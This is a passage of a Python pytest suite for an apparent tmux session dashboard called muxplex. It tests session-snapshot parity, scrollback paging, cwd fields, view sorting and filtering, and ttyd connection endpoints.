# halted follow-up queue at all -- the exact silent stall item A teaches
# it to watch for.
# ---------------------------------------------------------------------------


def _seed_parity_fixtures(
    monkeypatch, name: str, *, cwd: str | None = "/home/you/dev/muxplex"
):
    """Wire up get_sessions()/get_session_snapshot()'s shared dependencies
    so both endpoints resolve the SAME session with identical field values,
    for the key-set-parity and cwd-parity assertions below."""

    async def fake_capture_pane_window(session_name: str, s: int, e: int | None):
        return (100, 24, 50000, "pane text")

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: [name])
    monkeypatch.setattr("muxplex.main.get_snapshots", lambda: {name: "pane text"})
    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_capture_pane_window)
    monkeypatch.setattr(
        "muxplex.main.get_session_activity", lambda: {name: 1700000000.0}
    )
    monkeypatch.setattr(
        "muxplex.main.get_session_created_times", lambda: {name: 1690000000.0}
    )
    monkeypatch.setattr(
        "muxplex.main.get_session_cwds", lambda: {name: cwd} if cwd is not None else {}
    )


def test_session_snapshot_reaches_parity_with_bulk(client, monkeypatch):
    """The single-session and bulk-read entries for the SAME session must
    have identical key sets, differing only by fields that are legitimately
    single-session-only -- asserting the key SETS (not a hardcoded list) is
    what keeps the two endpoints from drifting apart again the next time a
    field is added to one.

    `lines` is single-session-only: the depth REQUESTED, unrelated to
    parity. The five scrollback-paging fields (`start`, `row_count`,
    `total`, `has_more`, `saturated` --
    docs/plans/2026-08-07-scrollback-paging-plan.md §3.3/§3.5) are
    DELIBERATELY single-session-only too: `GET /api/sessions` serves one
    shared ~2s-cycle poll cache at a fixed depth, consumed simultaneously
    by the PWA/muxplex-deck/every agent, and per-request paging metadata
    has no meaning against a value nobody requested a specific window of.
    """
    _seed_parity_fixtures(monkeypatch, "parity-session")

    bulk_response = client.get("/api/sessions")
    assert bulk_response.status_code == 200
    bulk_entry = bulk_response.json()[0]

    single_response = client.get("/api/sessions/parity-session")
    assert single_response.status_code == 200
    single_entry = single_response.json()

    bulk_keys = set(bulk_entry.keys())
    single_keys = set(single_entry.keys())

    single_only_fields = {
        "lines",
        "start",
        "row_count",
        "total",
        "has_more",
        "saturated",
    }
    assert single_keys - bulk_keys == single_only_fields
    assert bulk_keys - single_keys == set()

    for key in bulk_keys:
        assert single_entry[key] == bulk_entry[key], (
            f"{key!r} differs between GET /api/sessions ({bulk_entry[key]!r}) and "
            f"GET /api/sessions/{{name}} ({single_entry[key]!r})"
        )


def test_session_snapshot_surfaces_halted_followups(client, monkeypatch):
    """The motivating case: a halted follow-up queue must be visible from
    the single-session read, not just the bulk read."""
    from muxplex.state import save_state

    _seed_parity_fixtures(monkeypatch, "halted-session")
    save_state(
        {
            "active_session": None,
            "session_order": ["halted-session"],
            "sessions": {"halted-session": {"bell": {}}},
            "devices": {},
            "followups": {
                "halted-session": {
                    "revision": 3,
                    "items": [
                        {"id": "x", "text": "hi", "enter": True, "created_at": 0.0}
                    ],
                    "halted": {
                        "reason": "input_not_allowed",
                        "detail": "fenced",
                        "at": 1700000000.0,
                        "item_id": "x",
                    },
                }
            },
        }
    )

    response = client.get("/api/sessions/halted-session")
    assert response.status_code == 200
    body = response.json()
    assert body["followups"]["pending"] == 1
    assert body["followups"]["halted"] is True


def test_session_snapshot_includes_cwd(client, monkeypatch):
    """GET /api/sessions/{name} must carry cwd, the same observation the
    bulk read carries for this session."""
    _seed_parity_fixtures(monkeypatch, "cwd-session", cwd="/home/you/dev/muxplex")

    response = client.get("/api/sessions/cwd-session")
    assert response.status_code == 200
    assert response.json()["cwd"] == "/home/you/dev/muxplex"


# ---------------------------------------------------------------------------
# GET /api/sessions/{name}?before= -- scrollback paging
# (docs/plans/2026-08-07-scrollback-paging-plan.md §3, §6)
# ---------------------------------------------------------------------------


def test_before_omitted_never_probes_metadata(client, monkeypatch):
    """Omitting `before` must not call capture_pane_metadata() at all -- the
    unchanged path needs no probe, only the atomic capture_pane_window()
    call (plan §3.2: 'the existing capture_pane(name, lines) call is used
    unchanged on that path')."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        raise AssertionError("capture_pane_metadata must not be called")

    async def fake_window(name: str, s: int, e: int | None):
        return (100, 24, 50000, "text")

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)
    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_window)

    response = client.get("/api/sessions/alpha?lines=30")
    assert response.status_code == 200


def test_before_zero_returns_empty_page_not_400(client, monkeypatch):
    """before=0 means 'already at the beginning' -- 200 with an empty
    page, never a 4xx (plan §3.2's truth table)."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        return (500, 24, 50000)

    async def fake_window(name: str, s: int, e: int | None):
        raise AssertionError("capture-pane must not be called for before=0")

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)
    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_window)

    response = client.get("/api/sessions/alpha?lines=30&before=0")
    assert response.status_code == 200
    body = response.json()
    assert body["snapshot"] == ""
    assert body["row_count"] == 0
    assert body["start"] == 0
    assert body["has_more"] is False
    assert body["total"] == 524


def test_before_negative_returns_400(client, monkeypatch):
    """before < 0 -> 400, matching the endpoint's no-silent-clamp discipline."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        return (500, 24, 50000)

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)

    response = client.get("/api/sessions/alpha?lines=30&before=-1")
    assert response.status_code == 400
    assert "before" in response.json()["detail"]


def test_before_over_total_returns_400(client, monkeypatch):
    """before > total -> 400 -- a client bug or a saturation-era shift,
    never silently clamped to whatever IS available."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        return (500, 24, 50000)  # total = 524

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)

    response = client.get("/api/sessions/alpha?lines=30&before=525")
    assert response.status_code == 400
    assert "525" in response.json()["detail"]
    assert "524" in response.json()["detail"]


def test_before_computes_correct_relative_coordinates(client, monkeypatch):
    """A mid-history `before` must convert to the exact `-S`/`-E` tmux
    coordinates the plan's §3.4 pseudocode derives, and report `start`
    truthfully from the FRESH h returned by the atomic capture (not the
    probe's h0), self-consistent even when they differ."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        return (1000, 24, 50000)  # h0=1000, total0=1024

    captured = {}

    async def fake_window(name: str, s: int, e: int | None):
        captured["s"] = s
        captured["e"] = e
        # Simulate a FRESH h (1000, unchanged from the probe) paired with
        # the capture -- the common case where no drift occurred.
        return (1000, 24, 50000, "x" * 200)

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)
    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_window)

    # before=900, lines=100 -> row_count=100, start_guess=800
    # rel_s = 800-1000=-200, rel_e = 800+100-1-1000=-101
    response = client.get("/api/sessions/alpha?lines=100&before=900")
    assert response.status_code == 200
    assert captured == {"s": -200, "e": -101}
    body = response.json()
    assert body["start"] == 800
    assert body["row_count"] == 100
    assert body["has_more"] is True
    assert body["saturated"] is False


def test_before_reports_truthfully_when_h_drifted(client, monkeypatch):
    """If the fresh h paired with the actual capture differs from the
    probe's h0 (growth-only drift between the two calls), `start` must be
    computed from the FRESH h, not the probe -- the response always
    describes what was ACTUALLY captured (plan §3.4: 'report start
    truthfully instead of approximately')."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        return (1000, 24, 50000)  # h0=1000

    async def fake_window(name: str, s: int, e: int | None):
        # h grew by 5 between the probe and this atomic call.
        return (1005, 24, 50000, "x" * 100)

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)
    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_window)

    # before=900, lines=100 -> rel_s computed from h0=1000: -200
    response = client.get("/api/sessions/alpha?lines=100&before=900")
    assert response.status_code == 200
    body = response.json()
    # start = h(fresh)=1005 + rel_s(-200) = 805, NOT before-row_count=800.
    assert body["start"] == 805
    assert body["total"] == 1005 + 24


def test_before_saturated_true_when_history_size_at_limit(client, monkeypatch):
    """saturated = history_size >= history_limit, computed fresh from the
    atomic capture's own h -- independent of has_more."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def fake_metadata(name: str):
        return (200, 24, 200)  # h0 == history_limit -> saturated

    async def fake_window(name: str, s: int, e: int | None):
        return (200, 24, 200, "x" * 50)

    monkeypatch.setattr("muxplex.main.capture_pane_metadata", fake_metadata)
    monkeypatch.setattr("muxplex.main.capture_pane_window", fake_window)

    response = client.get("/api/sessions/alpha?lines=50&before=100")
    assert response.status_code == 200
    assert response.json()["saturated"] is True


# ---------------------------------------------------------------------------
# GET /api/view -- cwd is deliberately EXCLUDED (item C, §6.2)
#
# GET /api/view is a cheap, frequently-polled display resolution (view
# membership, attention, sort order) with deliberately no pane snapshots.
# A working directory is not a display concern; pinning this exclusion
# stops a future "consistency" PR from quietly adding it.
# ---------------------------------------------------------------------------


def test_view_does_not_carry_cwd(client, monkeypatch):
    """GET /api/view's session entries must never carry a cwd key."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr(
        "muxplex.main.get_session_cwds", lambda: {"alpha": "/home/you/dev/muxplex"}
    )

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert len(data["sessions"]) == 1
    assert "cwd" not in data["sessions"][0]


# ---------------------------------------------------------------------------
# GET /api/federation/sessions -- local branch carries cwd (item C, §6.2)
#
# Remote entries are spread `**s`, so a peer's cwd rides along automatically
# once that peer's own GET /api/sessions carries it. Omitting it on the
# LOCAL branch (a separate literal dict, not spread from get_sessions())
# would make local entries the poorer half of a merged fleet view.
# ---------------------------------------------------------------------------


def test_federation_local_entries_carry_cwd(client, monkeypatch, tmp_path):
    """GET /api/federation/sessions' local-session branch must carry the
    same cwd observation GET /api/sessions carries."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps({"device_name": "my-workstation", "remote_instances": []})
    )

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["fed-session"])
    monkeypatch.setattr(
        "muxplex.main.get_snapshots", lambda: {"fed-session": "pane text"}
    )
    monkeypatch.setattr(
        "muxplex.main.get_session_cwds",
        lambda: {"fed-session": "/home/you/dev/muxplex"},
    )

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()
    local = [s for s in data if s.get("remoteId") is None]
    assert len(local) == 1
    assert local[0]["cwd"] == "/home/you/dev/muxplex"


# ---------------------------------------------------------------------------
# GET /api/view
# ---------------------------------------------------------------------------


def _view_settings(**overrides) -> dict:
    """Build a minimal settings dict for /api/view tests; merge overrides."""
    base = {"sort_order": "manual", "hidden_sessions": [], "views": []}
    base.update(overrides)
    return base


def test_get_view_default_shape_and_all_view(client, monkeypatch):
    """GET /api/view with no views defined returns view='all', views=['all'],
    sort='server', and all sessions (no hidden_sessions/views configured)."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["view"] == "all"
    assert data["views"] == ["all", "hidden"]
    assert data["sort"] == "server"
    names = [s["name"] for s in data["sessions"]]
    assert names == ["alpha", "beta"]
    for s in data["sessions"]:
        assert "active" in s
        assert "needs_attention" in s
        assert "bell" in s
        assert "last_activity_at" in s


def test_get_view_named_view_filters_membership(client, monkeypatch):
    """GET /api/view with active_view set to a user view only returns member sessions."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["alpha", "beta", "gamma"]
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr(
        "muxplex.main.load_settings",
        lambda: _view_settings(
            views=[{"name": "Work", "sessions": ["alpha", "gamma"]}]
        ),
    )

    state = load_state()
    state["active_view"] = "Work"
    save_state(state)

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["view"] == "Work"
    assert data["views"] == ["all", "Work", "hidden"]
    names = {s["name"] for s in data["sessions"]}
    assert names == {"alpha", "gamma"}


def test_get_view_unknown_view_returns_empty_but_echoes_name(client, monkeypatch):
    """GET /api/view with an active_view that matches no user view returns an
    empty sessions list while still echoing the (unresolvable) view name."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    state = load_state()
    state["active_view"] = "Ghost"
    save_state(state)

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["view"] == "Ghost"
    assert data["sessions"] == []


def test_get_view_all_excludes_hidden_sessions(client, monkeypatch):
    """GET /api/view for 'all' excludes sessions in settings.hidden_sessions."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr(
        "muxplex.main.load_settings",
        lambda: _view_settings(hidden_sessions=["beta"]),
    )

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    names = [s["name"] for s in data["sessions"]]
    assert names == ["alpha"]


def test_get_view_views_list_is_all_plus_user_views_plus_hidden_last(
    client, monkeypatch
):
    """The 'views' list is 'all' + user views (settings order) + 'hidden' last.

    'hidden' is appended (not omitted) so clients that build a browsable
    view list from this field alone -- the soft deck's picker
    (frontend/deck/deck.js) is the first such consumer -- can reach it, the
    same as the hardware sidecar's dial-0 cycle list and the PWA's
    hardcoded-last "Hidden" dropdown entry. See main.py's get_view()
    docstring for the full rationale, including why this does NOT change
    the PWA (it never reads this field for its own dropdown).
    """
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr(
        "muxplex.main.load_settings",
        lambda: _view_settings(
            views=[{"name": "Work", "sessions": []}, {"name": "Play", "sessions": []}]
        ),
    )

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["views"] == ["all", "Work", "Play", "hidden"]


def test_get_view_views_list_hidden_is_always_last_even_with_no_user_views(
    client, monkeypatch
):
    """With zero user-defined views, 'views' is exactly ['all', 'hidden']."""
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    response = client.get("/api/view")
    assert response.status_code == 200
    assert response.json()["views"] == ["all", "hidden"]


def test_get_view_sort_omitted_alphabetical_setting_sorts_by_name(client, monkeypatch):
    """When sort is omitted and settings.sort_order == 'alphabetical', sessions
    are sorted by name and 'sort' echoes 'alphabetical'."""
    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["zeta", "alpha", "mu"]
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr(
        "muxplex.main.load_settings",
        lambda: _view_settings(sort_order="alphabetical"),
    )

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["sort"] == "alphabetical"
    assert [s["name"] for s in data["sessions"]] == ["alpha", "mu", "zeta"]


def test_get_view_sort_omitted_manual_setting_preserves_enumeration_order(
    client, monkeypatch
):
    """When sort is omitted and settings.sort_order != 'alphabetical', the
    /api/sessions enumeration order is preserved and 'sort' echoes 'server'."""
    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["zeta", "alpha", "mu"]
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr(
        "muxplex.main.load_settings", lambda: _view_settings(sort_order="manual")
    )

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["sort"] == "server"
    assert [s["name"] for s in data["sessions"]] == ["zeta", "alpha", "mu"]


def test_get_view_bad_sort_value_returns_400(client, monkeypatch):
    """GET /api/view?sort=bogus returns 400 (fail loud, no silent fallback)."""
    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    response = client.get("/api/view", params={"sort": "bogus"})
    assert response.status_code == 400


def test_get_view_sort_attention_bell_tier_ordered_by_last_fired_desc(
    client, monkeypatch
):
    """?sort=attention puts needs_attention sessions first, freshest bell first."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["quiet", "older-bell", "newer-bell"]
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    state = load_state()
    state["sessions"]["older-bell"] = {
        "bell": {"unseen_count": 1, "last_fired_at": 1000.0, "seen_at": None}
    }
    state["sessions"]["newer-bell"] = {
        "bell": {"unseen_count": 1, "last_fired_at": 2000.0, "seen_at": None}
    }
    save_state(state)

    response = client.get("/api/view", params={"sort": "attention"})
    assert response.status_code == 200
    data = response.json()
    assert data["sort"] == "attention"
    names = [s["name"] for s in data["sessions"]]
    assert names[0] == "newer-bell"
    assert names[1] == "older-bell"
    assert names[2] == "quiet"
    assert data["sessions"][0]["needs_attention"] is True
    assert data["sessions"][1]["needs_attention"] is True
    assert data["sessions"][2]["needs_attention"] is False


def test_get_view_sort_attention_active_session_does_not_change_position(
    client, monkeypatch
):
    """Selecting a session (state.active_session) must NOT change its position
    in ?sort=attention -- ordering tracks bell/agent-turn-completion events,
    not user navigation. A prior revision (v0.38.1) added a dedicated
    "active session" tier to fix a symptom (the actively-worked session
    sinking to the bottom) whose real cause was a dead bell hook -- fixed in
    the same release. With bells actually delivering, a bumping tier is not
    just redundant, it's wrong: it moves a session because the user selected
    it. See docs/API_SEMANTICS.md."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list", lambda: ["recent", "active-one", "old"]
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    # No bells fired -> tier 1 empty, tier 2 preserves incoming order (stable
    # sort, all bell.last_fired_at None) regardless of which session is active.
    response_before = client.get("/api/view", params={"sort": "attention"})
    names_before = [s["name"] for s in response_before.json()["sessions"]]
    assert names_before == ["recent", "active-one", "old"]

    state = load_state()
    state["active_session"] = "active-one"
    save_state(state)

    response_after = client.get("/api/view", params={"sort": "attention"})
    assert response_after.status_code == 200
    data = response_after.json()
    names_after = [s["name"] for s in data["sessions"]]
    assert names_after == names_before, (
        "selecting a session must not reorder the attention sort"
    )
    by_name = {s["name"]: s["active"] for s in data["sessions"]}
    assert by_name == {"recent": False, "active-one": True, "old": False}, (
        "the 'active' field itself must still reflect the selection -- only"
        " the ORDERING is unaffected"
    )


def test_get_view_sort_attention_active_and_belled_session_ranked_by_bell_only(
    client, monkeypatch
):
    """A session that is BOTH the active session and needs_attention is
    ordered purely by tier 1 bell recency -- being active confers no
    additional ordering boost, and there is no separate tier to place it in
    or duplicate it out of."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list",
        lambda: ["other-belled", "active-and-belled"],
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    state = load_state()
    state["active_session"] = "active-and-belled"
    state["sessions"]["other-belled"] = {
        "bell": {"unseen_count": 1, "last_fired_at": 2000.0, "seen_at": None}
    }
    state["sessions"]["active-and-belled"] = {
        "bell": {"unseen_count": 1, "last_fired_at": 1000.0, "seen_at": None}
    }
    save_state(state)

    response = client.get("/api/view", params={"sort": "attention"})
    assert response.status_code == 200
    data = response.json()
    assert len(data["sessions"]) == 2, "no session may be duplicated"
    names = [s["name"] for s in data["sessions"]]
    assert names == ["other-belled", "active-and-belled"], (
        "a fresher bell must outrank the active session -- active status"
        " confers no ordering boost"
    )
    by_name = {s["name"]: s["active"] for s in data["sessions"]}
    assert by_name == {"other-belled": False, "active-and-belled": True}


def test_get_view_sort_attention_third_tier_orders_by_bell_last_fired_nulls_last(
    client, monkeypatch
):
    """?sort=attention orders the remaining (non-bell, non-active) sessions by
    bell.last_fired_at descending, with sessions that have never belled
    (last_fired_at is None) sorting last."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list",
        lambda: ["never-belled", "old-bell", "recent-bell"],
    )
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    state = load_state()
    state["sessions"]["old-bell"] = {
        "bell": {"unseen_count": 0, "last_fired_at": 100.0, "seen_at": 100.0}
    }
    state["sessions"]["recent-bell"] = {
        "bell": {"unseen_count": 0, "last_fired_at": 2000.0, "seen_at": 2000.0}
    }
    save_state(state)

    response = client.get("/api/view", params={"sort": "attention"})
    assert response.status_code == 200
    data = response.json()
    names = [s["name"] for s in data["sessions"]]
    assert names == ["recent-bell", "old-bell", "never-belled"]


def test_get_view_sort_attention_third_tier_follows_bell_not_activity(
    client, monkeypatch
):
    """Regression guard: two non-bell sessions whose last_activity_at values are
    in the OPPOSITE order from their bell.last_fired_at values must be ordered
    by bell.last_fired_at, not last_activity_at. This is the exact bug report:
    tmux window_activity bumps on any pane redraw (spinners, status-line
    clocks), so activity-based ordering churned on every ~2s poll cycle even
    with no real bell event."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr(
        "muxplex.main.get_session_list",
        lambda: ["fresh-activity-old-bell", "old-activity-fresh-bell"],
    )
    # last_activity_at order: fresh-activity-old-bell (2000) > old-activity-fresh-bell (100)
    monkeypatch.setattr(
        "muxplex.main.get_session_activity",
        lambda: {"fresh-activity-old-bell": 2000.0, "old-activity-fresh-bell": 100.0},
    )
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    # bell.last_fired_at order is the OPPOSITE: old-activity-fresh-bell (2000) > fresh-activity-old-bell (100)
    state = load_state()
    state["sessions"]["fresh-activity-old-bell"] = {
        "bell": {"unseen_count": 0, "last_fired_at": 100.0, "seen_at": 100.0}
    }
    state["sessions"]["old-activity-fresh-bell"] = {
        "bell": {"unseen_count": 0, "last_fired_at": 2000.0, "seen_at": 2000.0}
    }
    save_state(state)

    response = client.get("/api/view", params={"sort": "attention"})
    assert response.status_code == 200
    data = response.json()
    names = [s["name"] for s in data["sessions"]]
    # Must follow bell.last_fired_at (old-activity-fresh-bell first), NOT
    # last_activity_at (which would put fresh-activity-old-bell first).
    assert names == ["old-activity-fresh-bell", "fresh-activity-old-bell"]


def test_get_view_active_field_reflects_active_session(client, monkeypatch):
    """The 'active' field on each session is True only for state.active_session."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["one", "two"])
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    state = load_state()
    state["active_session"] = "two"
    save_state(state)

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    by_name = {s["name"]: s["active"] for s in data["sessions"]}
    assert by_name == {"one": False, "two": True}


def test_get_view_needs_attention_false_when_bell_already_seen(client, monkeypatch):
    """needs_attention is False (via the endpoint) once seen_at >= last_fired_at."""
    from muxplex.state import load_state, save_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["acked"])
    monkeypatch.setattr("muxplex.main.get_session_activity", dict)
    monkeypatch.setattr("muxplex.main.load_settings", lambda: _view_settings())

    state = load_state()
    state["sessions"]["acked"] = {
        "bell": {"unseen_count": 1, "last_fired_at": 1000.0, "seen_at": 2000.0}
    }
    save_state(state)

    response = client.get("/api/view")
    assert response.status_code == 200
    data = response.json()
    assert data["sessions"][0]["needs_attention"] is False


# ---------------------------------------------------------------------------
# POST /api/sessions/{name}/connect
# ---------------------------------------------------------------------------


def test_connect_session_returns_200(client, monkeypatch):
    """POST /api/sessions/{name}/connect returns 200 and correct body when session exists."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def mock_ensure(name):
        pass

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)

    response = client.post("/api/sessions/alpha/connect")
    assert response.status_code == 200
    data = response.json()
    assert data["active_session"] == "alpha"
    assert data["ttyd_port"] == 7682


def test_connect_session_sets_active_session(client, monkeypatch):
    """POST /api/sessions/{name}/connect persists active_session to state."""
    from muxplex.state import load_state

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def mock_ensure(name):
        pass

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)

    client.post("/api/sessions/alpha/connect")

    state = load_state()
    assert state["active_session"] == "alpha"


def test_connect_session_calls_ensure_ttyd(client, monkeypatch):
    """POST /api/sessions/{name}/connect calls ensure_ttyd(name)."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    calls = []

    async def mock_ensure(name):
        calls.append(name)

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)

    response = client.post("/api/sessions/alpha/connect")
    assert response.status_code == 200
    assert calls == ["alpha"]


def test_connect_two_sessions_leaves_both_ttyds_alive(client, monkeypatch):
    """Connect X then Y -> both sockets live. The core behavioral claim.

    ensure_ttyd() is idempotent and per-session: connecting to a SECOND
    session must never call kill_ttyd (or anything else) for the first --
    that single guarantee is the entire reason this migration exists.
    """
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])

    ensure_calls: list[str] = []
    kill_calls: list[str] = []

    async def mock_ensure(name):
        ensure_calls.append(name)

    async def mock_kill(name):
        kill_calls.append(name)
        return True

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)
    monkeypatch.setattr("muxplex.main.kill_ttyd", mock_kill)

    r1 = client.post("/api/sessions/alpha/connect")
    r2 = client.post("/api/sessions/beta/connect")

    assert r1.status_code == 200
    assert r2.status_code == 200
    assert ensure_calls == ["alpha", "beta"]
    assert kill_calls == [], (
        "connecting to a second session must never kill the first's ttyd"
    )


def test_connect_no_longer_returns_terminal_conflict(client, monkeypatch):
    """Two groups, two sessions -> both 200; no 409."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])

    async def mock_ensure(name):
        pass

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)

    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dA",
            "label": "A",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 0.0,
            "sync_group": "device:dA",
        },
    )
    client.post(
        "/api/heartbeat",
        json={
            "device_id": "dB",
            "label": "B",
            "viewing_session": None,
            "view_mode": "grid",
            "last_interaction_at": 0.0,
            "sync_group": "device:dB",
        },
    )

    r1 = client.post("/api/sessions/alpha/connect?device_id=dA")
    r2 = client.post("/api/sessions/beta/connect?device_id=dB")

    assert r1.status_code == 200
    assert r2.status_code == 200
    assert "terminal_conflict" not in r1.json()
    assert "terminal_conflict" not in r2.json()


def test_connect_accepts_and_ignores_takeover(client, monkeypatch):
    """?takeover=true -> 200, no 422."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def mock_ensure(name):
        pass

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure)

    response = client.post("/api/sessions/alpha/connect?takeover=true")
    assert response.status_code == 200


def test_agent_guide_does_not_prescribe_retired_terminal_conflict():
    """AGENT_GUIDE.md must not tell agents to handle a response /connect cannot emit.

    Pairs with test_connect_no_longer_returns_terminal_conflict above, which
    pins the server side. That test kept the server honest while the guide
    rotted for a full release, telling agent authors to write handling for a
    409 the server has no path to and to recover with a query parameter it
    explicitly ignores; this one closes the other half.

    Deliberately two narrow string assertions, not a doc-lint suite -- see
    AGENTS.md on test_frontend_js.py for why source-text assertions earn their
    place only when they guard a claim that has already rotted.
    """
    guide = (Path(__file__).parent.parent.parent / "docs" / "AGENT_GUIDE.md").read_text(
        encoding="utf-8"
    )
    assert "terminal_conflict" not in guide
    assert "takeover=true" not in guide


def test_connect_500_on_spawn_failure(client, monkeypatch):
    """ensure_ttyd raising TtydSpawnError -> 500."""
    from muxplex.ttyd import TtydSpawnError

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def _fail(name):
        raise TtydSpawnError("ttyd exited 1 before creating the socket")

    monkeypatch.setattr("muxplex.main.ensure_ttyd", _fail)

    response = client.post("/api/sessions/alpha/connect")
    assert response.status_code == 500


def test_connect_503_on_capacity(client, monkeypatch):
    """TtydCapacityError -> 503."""
    from muxplex.ttyd import TtydCapacityError

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha"])

    async def _fail(name):
        raise TtydCapacityError("at capacity")

    monkeypatch.setattr("muxplex.main.ensure_ttyd", _fail)

    response = client.post("/api/sessions/alpha/connect")
    assert response.status_code == 503


def test_connect_nonexistent_session_returns_404(client, monkeypatch):
    """POST /api/sessions/{name}/connect returns 404 when session is not in list."""
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["alpha", "beta"])

    response = client.post("/api/sessions/gamma/connect")
    assert response.status_code == 404


# ---------------------------------------------------------------------------
# DELETE /api/sessions/current
# ---------------------------------------------------------------------------


